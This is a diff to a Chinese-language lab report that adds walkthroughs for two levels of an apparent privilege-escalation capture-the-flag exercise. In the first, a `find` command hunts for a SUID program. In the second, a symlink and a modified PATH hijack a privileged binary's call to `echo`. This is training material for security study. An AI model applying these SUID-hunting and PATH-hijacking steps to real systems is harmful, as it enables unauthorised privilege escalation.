@@ -22,6 +22,31 @@
 
 ## 二、 实验内容
 
+
+### level00
+
+find-suid
+
+寻找suid程序，利用find指令
+查找当前用户id
+`id`
+查找属于当前用户的程序
+`find / -uid 999 2>/dev/null`
+运行/bin/.../flag00，得到flag
+![](img/level00.png)
+
+
+### level01
+
+attack-env
+
+通过修改环境变量的值，在level01目录下新建echo链接到getflag01，得到flag
+`ln -s /bin/getflag01 /home/level01/echo`
+`PATH=/home/level01:$PATH`
+`/home/flag01/flag01`
+
+![](img/level01.png)
+
 ###  level02
 attack-env-again
 
